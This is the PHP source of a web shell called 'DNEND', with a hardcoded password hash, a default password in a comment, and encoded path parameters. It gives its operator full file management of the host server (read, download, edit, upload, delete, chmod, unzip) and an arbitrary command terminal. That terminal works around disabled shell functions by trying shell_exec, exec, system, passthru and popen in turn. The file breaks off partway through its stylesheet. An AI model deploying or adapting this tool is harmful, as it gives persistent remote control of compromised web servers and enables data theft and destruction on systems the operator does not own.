<?php
// ===================================================
// GANTI PASSWORD DI SINI YA, GANTI PASS PAKE BCRYPT //default pass dnend993
define('DNEND_PASS','$2a$12$.StWCE111nDi6fUmT.MNWOZ1X./uUgn32GM2AhjeTzIKDvVtBBwra');
// ===================================================
if(!defined('DNEND_KEY'))    define('DNEND_KEY','dn3nd99x!k82');
if(!defined('DNEND_NOAUTH')) define('DNEND_NOAUTH',false);
define('DNEND_VER','v 1.0');

error_reporting(0);
@set_time_limit(0);
@ini_set('memory_limit','256M');
session_start();

$isWin  = strtoupper(substr(PHP_OS,0,3))==='WIN';
$domain = strtoupper(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'localhost');
$TITLE  = "DNEND [$domain]";

function encP($p){
    $k=DNEND_KEY;$kl=strlen($k);$o='';
    for($i=0;$i<strlen($p);$i++) $o.=chr(ord($p[$i])^ord($k[$i%$kl]));
    return rtrim(strtr(base64_encode($o),'+/=','-_,'),',');
}
function decP($e){
    $d=base64_decode(strtr($e,'-_,','+/='));
    $k=DNEND_KEY;$kl=strlen($k);$o='';
    for($i=0;$i<strlen($d);$i++) $o.=chr(ord($d[$i])^ord($k[$i%$kl]));
    return $o;
}
function dnPerm($f){
    $p=@fileperms($f);if($p===false)return'----------';
    $t=($p&0x4000)?'d':(($p&0xA000)?'l':'-');
    $t.=($p&0400)?'r':'-';$t.=($p&0200)?'w':'-';$t.=($p&0100)?'x':'-';
    $t.=($p&0040)?'r':'-';$t.=($p&0020)?'w':'-';$t.=($p&0010)?'x':'-';
    $t.=($p&0004)?'r':'-';$t.=($p&0002)?'w':'-';$t.=($p&0001)?'x':'-';
    return $t;
}
function dnOct($f){$p=@fileperms($f);return $p!==false?substr(sprintf('%o',$p),-4):'----';}
function dnSize($b){
    if($b<=0)return '0 B';
    if($b<1024)return $b.' B';
    if($b<1048576)return number_format($b/1024,1).' KB';
    if($b<1073741824)return number_format($b/1048576,1).' MB';
    return number_format($b/1073741824,2).' GB';
}
function dnRmdir($d){
    if(!is_dir($d))return @unlink($d);
    $it=@scandir($d);
    if($it)foreach($it as $f){if($f==='.'||$f==='..')continue;dnRmdir($d.'/'.$f);}
    return @rmdir($d);
}
function dnZip($srcs,$dst){
    if(!class_exists('ZipArchive'))return false;
    $z=new ZipArchive();
    if($z->open($dst,ZipArchive::CREATE|ZipArchive::OVERWRITE)!==true)return false;
    foreach((array)$srcs as $src){
        $src=realpath($src);if(!$src||!file_exists($src))continue;
        if(is_file($src)){$z->addFile($src,basename($src));}
        else{
            $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::LEAVES_ONLY);
            foreach($it as $file)if(!$file->isDir())$z->addFile($file->getRealPath(),basename($src).'/'.substr($file->getRealPath(),strlen($src)+1));
        }
    }
    return $z->close();
}
function dnSafe($cwd,$name){
    $name=basename($name);
    if($name===''||$name==='.'||$name==='..')return false;
    $full=$cwd.'/'.$name;
    if(file_exists($full)){
        $real=realpath($full);$base=realpath($cwd);
        if($real===false||$base===false)return false;
        $base=rtrim(str_replace('\\','/',$base),'/');
        $real=str_replace('\\','/',$real);
        return(strpos($real.'/',$base.'/')===0)?$real:false;
    }
    return $full;
}
function dnExec($cmd){
    $dis=array_map('trim',explode(',',(string)ini_get('disable_functions')));
    $out=false;
    if(!in_array('shell_exec',$dis)&&function_exists('shell_exec'))$out=@shell_exec($cmd);
    if($out===null||$out===false){if(!in_array('exec',$dis)&&function_exists('exec')){$ln=[];@exec($cmd,$ln);$out=implode("\n",$ln);}}
    if($out===null||$out===false){if(!in_array('system',$dis)&&function_exists('system')){ob_start();@system($cmd);$out=ob_get_clean();}}
    if($out===null||$out===false){if(!in_array('passthru',$dis)&&function_exists('passthru')){ob_start();@passthru($cmd);$out=ob_get_clean();}}
    if($out===null||$out===false){if(!in_array('popen',$dis)&&function_exists('popen')){$h=@popen($cmd,'r');if($h){$out='';while(!feof($h))$out.=fread($h,8192);pclose($h);}}}
    if($out===null||$out===false)return'__DISABLED__';
    return(string)$out;
}
function dnH($s){return htmlspecialchars((string)$s,ENT_QUOTES,'UTF-8');}
function monacoLang($n){
    $e=strtolower(pathinfo($n,PATHINFO_EXTENSION));
    $m=['php'=>'php','html'=>'html','htm'=>'html','js'=>'javascript','ts'=>'typescript',
        'jsx'=>'javascript','tsx'=>'typescript','json'=>'json','css'=>'css','less'=>'less',
        'scss'=>'scss','xml'=>'xml','svg'=>'xml','py'=>'python','sh'=>'shell','bash'=>'shell',
        'sql'=>'sql','md'=>'markdown','markdown'=>'markdown','c'=>'c','cpp'=>'cpp',
        'h'=>'c','java'=>'java','go'=>'go','rb'=>'ruby','yaml'=>'yaml','yml'=>'yaml',
        'ini'=>'ini','toml'=>'ini','conf'=>'ini','env'=>'ini','txt'=>'plaintext','log'=>'plaintext'];
    return isset($m[$e])?$m[$e]:'plaintext';
}
function fileLang($n){
    $e=strtolower(pathinfo($n,PATHINFO_EXTENSION));
    $m=['php'=>'PHP','html'=>'HTML','htm'=>'HTML','js'=>'JS','ts'=>'TS','jsx'=>'JSX',
        'tsx'=>'TSX','json'=>'JSON','css'=>'CSS','scss'=>'SCSS','less'=>'LESS',
        'xml'=>'XML','svg'=>'SVG','py'=>'Python','sh'=>'Shell','bash'=>'Shell',
        'sql'=>'SQL','md'=>'Markdown','java'=>'Java','c'=>'C','cpp'=>'C++',
        'go'=>'Go','rb'=>'Ruby','yaml'=>'YAML','yml'=>'YAML','ini'=>'INI',
        'env'=>'ENV','conf'=>'Conf','toml'=>'TOML','txt'=>'Text','log'=>'Log'];
    return isset($m[$e])?$m[$e]:strtoupper($e?$e:'Text');
}
function breadcrumb($cwd,$homeEnc){
    global $isWin;
    $html='<a class="bc-home" href="?p='.$homeEnc.'" title="Home">'.
          '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>'.
          '</a><span class="bcs">/</span>';
    if($isWin){
        $parts=explode('\\',rtrim($cwd,'\\'));$acc='';
        foreach($parts as $p){
            if($p==='')continue;
            $acc=($acc==='')?$p:$acc.'\\'.$p;
            $html.='<a href="?p='.encP($acc).'">'.dnH($p).'</a><span class="bcs">\\</span>';
        }
    }else{
        $parts=array_values(array_filter(explode('/',$cwd),function($x){return $x!=='';}));
        $acc='';
        foreach($parts as $p){
            $acc.='/'.$p;
            $html.='<a href="?p='.encP($acc).'">'.dnH($p).'</a><span class="bcs">/</span>';
        }
    }
    return $html;
}

if(DNEND_NOAUTH){$LOGGED=true;}
else{
    if(isset($_GET['logout'])){session_destroy();header('Location: '.$_SERVER['PHP_SELF']);exit;}
    if(isset($_POST['dnend_login'])){
        $ph=DNEND_PASS;
        $ok=($ph[0]==='$'&&strpos($ph,'$2')===0)?password_verify($_POST['pass'],$ph):($_POST['pass']===$ph);
        if($ok){$_SESSION['dnend']=true;header('Location: '.$_SERVER['PHP_SELF']);exit;}
        $LOGIN_ERR='Invalid password.';
    }
    $LOGGED=!empty($_SESSION['dnend']);
}

$msg=$err='';$items=[];
$HOME_DIR=__DIR__;
$cwd=$HOME_DIR;

if($LOGGED){
    if(isset($_GET['p'])&&$_GET['p']!==''){
        $dec=decP($_GET['p']);
        $try=realpath($dec);
        $cwd=($try&&is_dir($try))?$try:$HOME_DIR;
    }
    $action=isset($_POST['action'])?$_POST['action']:(isset($_GET['action'])?$_GET['action']:'');

    if($action==='download'&&isset($_GET['f'])){
        $f=dnSafe($cwd,decP($_GET['f']));
        if($f&&is_file($f)){
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.rawurlencode(basename($f)).'"');
            header('Content-Length: '.filesize($f));
            ob_clean();flush();readfile($f);exit;
        }
        die('File not found.');
    }
    if($action==='read_file'&&isset($_GET['f'])){
        $f=dnSafe($cwd,decP($_GET['f']));
        if($f&&is_file($f)){
            header('Content-Type: text/plain; charset=utf-8');
            header('Content-Length: '.filesize($f));
            readfile($f);
        }else{http_response_code(404);echo'Not found.';}
        exit;
    }
    if($action==='terminal'){
        header('Content-Type: application/json; charset=utf-8');
        $cmd=trim(isset($_POST['cmd'])?$_POST['cmd']:'');
        $dir=isset($_POST['dir'])?decP($_POST['dir']):(isset($_SESSION['term_cwd'])?$_SESSION['term_cwd']:$cwd);
        $dir=(realpath($dir)&&is_dir(realpath($dir)))?realpath($dir):$cwd;
        if($cmd===''){echo json_encode(['out'=>'','cwd'=>encP($dir),'cwdR'=>$dir]);exit;}
        if(preg_match('/^cd(?:\s+(.+))?$/i',$cmd,$m)){
            $_home=isset($_SERVER['HOME'])?$_SERVER['HOME']:($isWin?'C:\\':'/');
            $to=isset($m[1])?trim($m[1]):$_home;
            if($to==='~')$to=$_home;
            if($to==='-')$to=isset($_SESSION['term_prev_cwd'])?$_SESSION['term_prev_cwd']:$dir;
            if($to[0]!=='/'&&!($isWin&&isset($to[1])&&$to[1]===':'))$to=$dir.($isWin?'\\':'/').$to;
            $real=realpath($to);
            if($real&&is_dir($real)){$_SESSION['term_prev_cwd']=$dir;$_SESSION['term_cwd']=$real;echo json_encode(['out'=>'','cwd'=>encP($real),'cwdR'=>$real]);exit;}
            echo json_encode(['out'=>"bash: cd: $to: No such file or directory\n",'cwd'=>encP($dir),'cwdR'=>$dir]);exit;
        }
        $_SESSION['term_cwd']=$dir;
        $sep=$isWin?' & ':' && ';
        $out=dnExec('cd '.escapeshellarg($dir).$sep.$cmd.' 2>&1');
        if($out==='__DISABLED__')$out="Error: shell functions disabled.\n";
        echo json_encode(['out'=>$out,'cwd'=>encP($dir),'cwdR'=>$dir]);exit;
    }
    if($action==='delete'&&isset($_POST['target'])){
        $t=dnSafe($cwd,$_POST['target']);
        if($t&&file_exists($t))dnRmdir($t)?$msg='Deleted.':$err='Delete failed.';
        else $err='Target not found.';
    }
    if($action==='rename'&&isset($_POST['old'],$_POST['new_name'])){
        $nn=basename(trim($_POST['new_name']));
        $old=$cwd.'/'.basename($_POST['old']);
        $new=$cwd.'/'.$nn;
        if(!$nn)$err='New name cannot be empty.';
        elseif(!file_exists($old))$err='Source not found.';
        elseif(file_exists($new))$err='Destination already exists.';
        else @rename($old,$new)?$msg='Renamed.':$err='Rename failed.';
    }
    if($action==='chmod'&&isset($_POST['target'],$_POST['mode'])){
        $t=$cwd.'/'.basename($_POST['target']);
        $mode=octdec(preg_replace('/[^0-7]/','',$_POST['mode']));
        if(!file_exists($t))$err='Target not found.';
        else @chmod($t,$mode)?$msg='Permission changed.':$err='chmod failed.';
    }
    if($action==='zip'&&isset($_POST['targets'])){
        $tg=array_filter(array_map(function($x)use($cwd){return $cwd.'/'.basename($x);},(array)$_POST['targets']),'file_exists');
        if(empty($tg)){$err='No valid targets.';}
        else{$dst=$cwd.'/archive_'.date('Ymd_His').'.zip';if(count($tg)===1&&is_file(reset($tg)))$dst=reset($tg).'.zip';dnZip($tg,$dst)?$msg='Zipped: '.basename($dst):$err='Zip failed.';}
    }
    if($action==='unzip'&&isset($_POST['target'])){
        $f=dnSafe($cwd,$_POST['target']);
        if(!$f||!is_file($f)){$err='File not found.';}
        elseif(!class_exists('ZipArchive')){$err='ZipArchive not available.';}
        else{$z=new ZipArchive();if($z->open($f)===true){$z->extractTo($cwd)?$msg='Unzipped.':$err='Unzip error.';$z->close();}else $err='Cannot open zip.';}
    }
    if($action==='bulk_delete'&&isset($_POST['targets'])){
        $c=0;foreach((array)$_POST['targets'] as $t){$fp=dnSafe($cwd,$t);if($fp&&file_exists($fp)&&dnRmdir($fp))$c++;}
        $msg='Deleted '.$c.' item(s).';
    }
    if($action==='mkdir'&&isset($_POST['name'])){
        $n=basename(trim($_POST['name']));
        if(!$n)$err='Name cannot be empty.';
        elseif(file_exists($cwd.'/'.$n))$err='Already exists.';
        else @mkdir($cwd.'/'.$n,0755)?$msg='Folder created.':$err='Failed (permission denied).';
    }
    if($action==='newfile'&&isset($_POST['name'])){
        $n=basename(trim($_POST['name']));
        if(!$n)$err='Filename cannot be empty.';
        elseif(file_exists($cwd.'/'.$n))$err='File already exists.';
        else{$r=@file_put_contents($cwd.'/'.$n,'');$r!==false?$msg='File created.':$err='Failed (permission denied).';}
    }
    if($action==='save_edit'&&isset($_POST['file'],$_POST['content'])){
        $f=$cwd.'/'.basename($_POST['file']);
        $r=@file_put_contents($f,$_POST['content']);
        $r!==false?$msg='File saved.':$err='Save failed.';
    }
    if($action==='upload'&&isset($_FILES['ufile'])){
        if($_FILES['ufile']['error']===0){
            $dst=$cwd.'/'.basename($_FILES['ufile']['name']);
            @move_uploaded_file($_FILES['ufile']['tmp_name'],$dst)?$msg='Uploaded: '.basename($dst):$err='Upload failed.';
        }else $err='Upload error '.$_FILES['ufile']['error'];
    }

    if($dh=@opendir($cwd)){
        while(($f=readdir($dh))!==false){
            if($f==='.'||$f==='..')continue;
            $fp=$cwd.'/'.$f;
            $items[]=['name'=>$f,'path'=>$fp,'isdir'=>is_dir($fp),'size'=>is_file($fp)?@filesize($fp):0,'perm'=>dnPerm($fp),'oct'=>dnOct($fp),'mtime'=>@filemtime($fp)];
        }
        closedir($dh);
    }
    usort($items,function($a,$b){if($a['isdir']!==$b['isdir'])return $b['isdir']?1:-1;return strcasecmp($a['name'],$b['name']);});
}

$uname     =@php_uname('s').' '.@php_uname('r');
$server_ip =isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:@gethostbyname((string)@gethostname());
$client_ip =isset($_SERVER['HTTP_X_FORWARDED_FOR'])?$_SERVER['HTTP_X_FORWARDED_FOR']:(isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'?');
if(strpos($client_ip,',')!==false)$client_ip=trim(explode(',',$client_ip)[0]);
$php_ver   =phpversion();
$whoami    =@exec('whoami');if(!$whoami)$whoami=@get_current_user()?:'?';
$disk_free =dnSize((int)@disk_free_space($cwd));
$disk_total=dnSize((int)@disk_total_space($cwd));
$cwdEnc    =encP($cwd);
$homeEnc   =encP($HOME_DIR);
$parent    =dirname($cwd);
$parentEnc =encP($parent);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">
<meta name="robots" content="noindex,nofollow">
<title><?php echo dnH($TITLE); ?></title>
<style>
:root{
  --bg:#141414;--bg2:#1e1e1e;--bg3:#252526;--bg4:#2d2d2d;--bg5:#383838;
  --bd:#333;--bd2:#4a4a4a;
  --tx:#d4d4d4;--tx2:#aaa;--tx3:#666;
  --blue:#4fc1ff;--b2:#569cd6;
  --green:#4ec9b0;--yellow:#dcdcaa;
  --red:#f44747;--purple:#c586c0;--cyan:#9cdcfe;--folder:#dcb67a;
  --fm:'Consolas','SF Mono','Fira Code',monospace;
  --fu:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
  --r:6px;--t:.13s ease;
}
*{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--tx);font-family:var(--fu);font-size:14px;min-height:100vh;line-height:1.5}
a{color:var(--blue);text-decoration:none}a:hover{color:var(--cyan)}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--bg5);border-radius:3px}
input,button,select,textarea{font-family:var(--fu)}
::selection{background:rgba(79,193,255,.15)}

.wrap{max-width:1700px;margin:0 auto;padding:12px 14px 110px}

/* HEADER */
.hdr{display:flex;gap:20px;align-items:flex-start;padding:10px 0 12px;flex-wrap:wrap}
.info-blk{flex:1 1 200px;min-width:0}
.info-label{color:var(--tx3);font-size:.63rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:7px}
.info-grid{display:grid;grid-template-columns:max-content 1fr;gap:1px 10px}
.ik{color:var(--tx3);font-size:.73rem;white-space:nowrap;padding:1px 0;font-weight:600}
.iv{color:var(--tx);font-size:.73rem;font-family:var(--fm);word-break:break-all;padding:1px 0}
.iv.g{color:var(--green)}
.logo-blk{flex-shrink:0;text-align:right}
.logo-art{color:var(--b2);font-family:var(--fm);font-size:clamp(4px,.75vw,8.5px);line-height:1.15;white-space:pre;display:block;opacity:.82;overflow:hidden}
.logo-meta{color:var(--tx3);font-size:.63rem;margin-top:4px;letter-spacing:.4px}
.logo-meta b{color:var(--b2)}

/* DIVIDER */
.hdiv{height:1px;background:var(--bd);margin:0 0 10px}

/* TOOLBAR — actions on top */
.toolbar{display:flex;flex-wrap:wrap;gap:5px;align-items:center;margin-bottom:7px}

/* PATH BAR */
.pathbar{display:flex;align-items:center;gap:4px;background:var(--bg2);border:1px solid var(--bd);border-radius:var(--r);padding:5px 10px;margin-bottom:8px;overflow-x:auto;white-space:nowrap;-webkit-overflow-scrolling:touch}
.bc-home{color:var(--b2);display:inline-flex;align-items:center;flex-shrink:0}
.bc-home:hover{color:var(--cyan)}
.pathbar a:not(.bc-home){color:var(--b2);font-family:var(--fm);font-size:.76rem;font-weight:600;flex-shrink:0}
.pathbar a:not(.bc-home):hover{color:var(--cyan)}
.bcs{color:var(--bd2);font-family:var(--fm);font-size:.76rem;flex-shrink:0;margin:0 1px}
.up-btn{display:inline-flex;align-items:center;color:var(--tx3);margin-right:4px;flex-shrink:0}
.up-btn:hover{color:var(--cyan)}

/* BUTTONS */
.btn{display:inline-flex;align-items:center;gap:5px;height:30px;padding:0 11px;border-radius:5px;border:1px solid;cursor:pointer;font-size:.76rem;font-weight:500;transition:var(--t);white-space:nowrap;line-height:1}
.btn-def{background:var(--bg3);color:var(--tx2);border-color:var(--bd)}
.btn-def:hover{background:var(--bg4);color:var(--tx);border-color:var(--bd2)}
.btn-bl{background:#07182a;color:var(--blue);border-color:#4fc1ff22}
.btn-bl:hover{background:var(--b2);color:#fff;border-color:var(--b2)}
.btn-gr{background:#071f17;color:var(--green);border-color:#4ec9b022}
.btn-gr:hover{background:var(--green);color:#141414}
.btn-ye{background:#1f1b07;color:var(--yellow);border-color:#dcdcaa22}
.btn-ye:hover{background:var(--yellow);color:#141414}
.btn-re{background:#1f0707;color:var(--red);border-color:#f4474722}
.btn-re:hover{background:var(--red);color:#fff}
.btn-cy{background:#071f1f;color:var(--cyan);border-color:#9cdcfe22}
.btn-cy:hover{background:var(--cyan);color:#141414}

/* ICON BUTTONS */
.bi{width:28px;height:28px;padding:0;display:inline-flex;align-items:center;justify-content:center;border-radius:5px;border:1px solid var(--bd);cursor:pointer;transition:var(--t);background:var(--bg4);color:var(--tx3);position:relative;flex-shrink:0}
.bi svg{width:13px;height:13px;pointer-events:none}
.bi:hover{color:var(--tx);border-color:var(--bd2);background:var(--bg5)}
.bi.r:hover{color:var(--cyan);border-color:var(--cyan)}
.bi.c:hover{color:var(--yellow);border-color:var(--yellow)}
.bi.d:hover{color:var(--blue);border-color:var(--blue)}
.bi.u:hover{color:var(--purple);border-color:var(--purple)}
.bi.x:hover{color:var(--red);border-color:var(--red)}
.bi::after{content:attr(title);position:absolute;bottom:calc(100% + 5px);left:50%;transform:translateX(-50%);background:#0a0a0a;color:#ccc;font-size:.63rem;padding:3px 7px;border-radius:4px;white-space:nowrap;pointer-events:none;opacity:0;transition:opacity .1s;border:1px solid var(--bd2);z-index:600}
.bi:hover::after{opacity:1}

/* ALERTS */
.alert{padding:8px 12px;border-radius:5px;margin-bottom:7px;font-size:.79rem;border-left:3px solid;display:flex;align-items:center;gap:7px;font-weight:500}
.a-ok{background:#0d1f18;color:var(--green);border-color:var(--green)}
.a-err{background:#1f0d0d;color:var(--red);border-color:var(--red)}

/* FILE TABLE */
.fs{background:var(--bg2);border:1px solid var(--bd);border-radius:var(--r)}
.fs-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch;border-radius:var(--r) var(--r) 0 0}
.ft{width:100%;border-collapse:collapse;min-width:560px}
.ft th{background:var(--bg);color:var(--tx3);font-size:.67rem;font-weight:700;text-transform:uppercase;letter-spacing:.8px;padding:7px 10px;text-align:left;border-bottom:2px solid var(--bd);white-space:nowrap}
.ft td{padding:5px 10px;border-bottom:1px solid var(--bg);vertical-align:middle;font-size:.8rem}
.ft tr:last-child td{border-bottom:none}
.ft tr.fr:hover td{background:var(--bg3)}
.cp{font-family:var(--fm);font-size:.71rem;color:var(--cyan)}
.co{font-family:var(--fm);font-size:.71rem;color:var(--yellow)}
.cs{text-align:right;font-family:var(--fm);font-size:.71rem;color:var(--tx3);white-space:nowrap;min-width:60px}
.cm{font-family:var(--fm);font-size:.69rem;color:var(--tx3);white-space:nowrap}
.ca{white-space:nowrap;text-align:right}
.cc{width:32px;text-align:center}
input[type=checkbox]{width:13px;height:13px;accent-color:var(--b2);cursor:pointer;vertical-align:middle}
.nc{display:flex;align-items:center;gap:6px;min-width:120px}
.fdi a{color:var(--folder);font-weight:700;font-size:.82rem}
.fdi a:hover{color:#f0c87a}
.ffi button{background:none;border:none;padding:0;cursor:pointer;color:var(--tx);font-size:.8rem;text-align:left;transition:var(--t);font-family:var(--fu)}
.ffi button:hover{color:var(--cyan)}
.ficon{width:13px;height:13px;flex-shrink:0;opacity:.6}
.etag{background:var(--bg5);border:1px solid var(--bd);border-radius:3px;padding:0 4px;font-size:.57rem;font-family:var(--fm);color:var(--tx3);line-height:14px;flex-shrink:0;white-space:nowrap}
.dtag{background:#2a2010;border:1px solid #dcb67a18;border-radius:3px;padding:0 4px;font-size:.57rem;font-family:var(--fm);color:var(--folder);line-height:14px;flex-shrink:0}

/* BULK FOOTER */
.bf{background:var(--bg);border-top:1px solid var(--bd);padding:7px 10px;display:flex;align-items:center;gap:6px;flex-wrap:wrap;border-radius:0 0 var(--r) var(--r)}
.bf .sl{color:var(--tx3);font-size:.74rem}
.bf .sc{color:var(--blue);font-weight:700;font-size:.74rem;min-width:16px}
.bdw{position:relative;margin-left:auto}
.bmb{background:var(--bg3);border:1px solid var(--bd2);color:var(--tx2);font-size:.74rem;height:27px;padding:0 10px;border-radius:5px;cursor:pointer;display:flex;align-items:center;gap:5px;transition:var(--t)}
.bmb:hover{border-color:var(--b2);color:var(--tx)}
.chv{width:10px;height:10px;transition:.13s}
.bmb.open .chv{transform:rotate(180deg)}
.bmd{position:absolute;bottom:calc(100% + 5px);right:0;background:var(--bg3);border:1px solid var(--bd2);border-radius:var(--r);min-width:155px;display:none;flex-direction:column;box-shadow:0 8px 30px rgba(0,0,0,.7);z-index:999;overflow:hidden}
.bmd.show{display:flex}
.bmi{display:flex;align-items:center;gap:7px;padding:8px 12px;cursor:pointer;font-size:.77rem;color:var(--tx2);border:none;background:none;width:100%;text-align:left;transition:var(--t)}
.bmi:hover{background:var(--bg4);color:var(--tx)}
.bmi.bz:hover{color:var(--green)}.bmi.bu:hover{color:var(--purple)}.bmi.bd:hover{color:var(--red)}
.bmi svg{width:13px;height:13px;flex-shrink:0}
.bm-sep{height:1px;background:var(--bd)}

/* MODAL */
.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.76);z-index:1000;align-items:center;justify-content:center;padding:12px;backdrop-filter:blur(4px)}
.ov.on{display:flex}
.modal{background:var(--bg2);border:1px solid var(--bd2);border-radius:10px;padding:20px;width:100%;max-width:440px;max-height:92vh;overflow-y:auto;box-shadow:0 12px 48px rgba(0,0,0,.7)}
.mh{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--bd)}
.mt{color:var(--tx);font-size:.86rem;font-weight:600;display:flex;align-items:center;gap:6px}
.mc{background:none;border:none;color:var(--tx3);cursor:pointer;font-size:.9rem;padding:2px 5px;border-radius:3px;transition:var(--t);line-height:1}
.mc:hover{color:var(--red)}
.fr{margin-bottom:10px}
.fr label{display:block;color:var(--tx3);font-size:.65rem;font-weight:700;letter-spacing:.5px;text-transform:uppercase;margin-bottom:4px}
.fr input{width:100%;background:var(--bg);color:var(--tx);border:1px solid var(--bd2);border-radius:5px;padding:7px 10px;outline:none;transition:var(--t);font-family:var(--fm);font-size:.81rem}
.fr input:focus{border-color:var(--b2);box-shadow:0 0 0 2px rgba(79,193,255,.08)}
.ma{display:flex;gap:6px;margin-top:12px;flex-wrap:wrap}
.chg{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin:7px 0}
.chc{background:var(--bg);border:1px solid var(--bd);border-radius:5px;padding:8px 9px}
.chc .cl{color:var(--b2);font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px}
.chr{display:flex;align-items:center;gap:5px;margin-bottom:3px;cursor:pointer;font-size:.75rem;color:var(--tx2)}
.chr:hover{color:var(--tx)}
.chr input{width:12px;height:12px;margin:0}

/* UPLOAD */
.uzone{border:2px dashed var(--bd2);border-radius:8px;padding:26px 16px;text-align:center;cursor:pointer;transition:var(--t);margin:7px 0;background:var(--bg)}
.uzone:hover,.uzone.drag{border-color:var(--b2);background:#07182a}
.uzone svg{opacity:.35;margin-bottom:7px}
.uzone p{color:var(--tx3);font-size:.79rem;margin-bottom:3px}
.uzone p b{color:var(--tx2)}
.uzone small{color:var(--tx3);font-size:.68rem}
.uf-name{margin-top:7px;padding:5px 9px;background:var(--bg4);border-radius:4px;font-size:.74rem;font-family:var(--fm);color:var(--cyan);display:none}
#ufile-inp{display:none}

/* EDITOR MODAL */
#em .modal{max-width:calc(100vw - 10px);width:1300px;max-height:97vh;padding:0;display:flex;flex-direction:column;overflow:hidden;border-radius:8px}
.etb{background:var(--bg3);border-bottom:1px solid var(--bd);padding:9px 13px;display:flex;align-items:center;gap:8px;flex-shrink:0}
.efn{color:var(--tx);font-weight:600;font-size:.83rem;font-family:var(--fm);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.elb{background:var(--b2);color:#fff;padding:1px 7px;border-radius:3px;font-size:.61rem;font-weight:700;flex-shrink:0}
.ebb{background:var(--bg3);border-top:1px solid var(--bd);padding:7px 13px;display:flex;align-items:center;justify-content:space-between;gap:7px;flex-shrink:0}
.ehi{color:var(--tx3);font-size:.67rem;font-family:var(--fm)}
#ed-wrap{flex:1;min-height:0;position:relative;overflow:hidden}
#ef textarea{display:none}

/* TERMINAL */
.tw{position:fixed;bottom:0;left:0;right:0;z-index:900;transform:translateY(100%);transition:transform .2s cubic-bezier(.4,0,.2,1)}
.tw.on{transform:translateY(0)}
.ttb{background:var(--bg2);border-top:2px solid var(--bd2);padding:5px 12px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;user-select:none}
.ttl{color:var(--cyan);font-size:.73rem;font-weight:700;display:flex;align-items:center;gap:6px}
.tcwd{color:var(--tx3);font-weight:400;font-size:.67rem;font-family:var(--fm);margin-left:3px;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.tbb{display:flex;gap:3px}
.tbtn{background:none;border:none;color:var(--tx3);cursor:pointer;font-size:.71rem;padding:2px 7px;border-radius:3px;transition:var(--t)}
.tbtn:hover{background:var(--bg4);color:var(--tx)}
.tbody{background:#0c0c0c;height:290px;display:flex;flex-direction:column;overflow:hidden}
.tout{flex:1;overflow-y:auto;padding:6px 10px;font-family:var(--fm);font-size:12px;line-height:1.5;white-space:pre-wrap;word-break:break-word;color:#ccc}
.tout .tc{color:#9cdcfe;font-weight:700}
.tout .to{color:#c8c8c8}
.tout .ts{color:#6a9955;font-style:italic}
.tir{display:flex;align-items:center;background:#0f0f0f;border-top:1px solid #222;padding:5px 10px;gap:5px;flex-shrink:0}
.tpr{color:#4ec9b0;font-family:var(--fm);font-size:12px;white-space:nowrap;font-weight:700;flex-shrink:0}
.tin{flex:1;background:none;border:none;color:#d4d4d4;font-family:var(--fm);font-size:12px;outline:none;caret-color:#4ec9b0}

/* LOGIN */
.lp{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.la{color:var(--b2);font-family:var(--fm);font-size:clamp(5px,1.3vw,10px);line-height:1.2;white-space:pre;text-align:center;margin-bottom:16px;opacity:.85}
.lb{background:var(--bg2);border:1px solid var(--bd2);border-radius:10px;padding:24px 26px;width:100%;max-width:350px;box-shadow:0 8px 40px rgba(0,0,0,.6)}
.lb h2{color:var(--tx);font-size:.86rem;font-weight:600;margin-bottom:3px}
.lb p{color:var(--tx3);font-size:.72rem;margin-bottom:15px}
.lb input[type=password]{width:100%;background:var(--bg);color:var(--tx);border:1px solid var(--bd2);border-radius:5px;padding:9px 10px;outline:none;margin-bottom:9px;font-size:.83rem;font-family:var(--fm);transition:var(--t)}
.lb input[type=password]:focus{border-color:var(--b2);box-shadow:0 0 0 2px rgba(79,193,255,.08)}
.lb .btn{width:100%;justify-content:center;height:34px}
.le{background:#1f0d0d;color:var(--red);border:1px solid #f4474722;border-radius:5px;padding:7px 10px;font-size:.76rem;margin-bottom:9px}
.pf{padding:12px 0 4px;color:var(--tx3);font-size:.65rem;text-align:center;letter-spacing:.4px;line-height:2}
.pf b{color:var(--b2)}
.empty{padding:38px 20px;text-align:center;color:var(--tx3)}
.empty svg{opacity:.16;display:block;margin:0 auto 10px}

@media(max-width:600px){
  .wrap{padding:9px 8px 110px}
  .hdr{padding:8px 0 9px;gap:8px;align-items:flex-start;flex-wrap:nowrap}
  .info-blk{flex:1 1 0;min-width:0}
  .logo-blk{flex-shrink:0;text-align:right;max-width:48%;overflow:hidden}
  .logo-art{font-size:clamp(2.8px,.65vw,4.5px)}
  .btn{height:28px;padding:0 8px;font-size:.72rem;gap:3px}
  .btn svg{width:11px;height:11px}
  .modal{max-width:100%;padding:14px 12px}
  .chg{grid-template-columns:1fr 1fr}
  .tbody{height:210px}
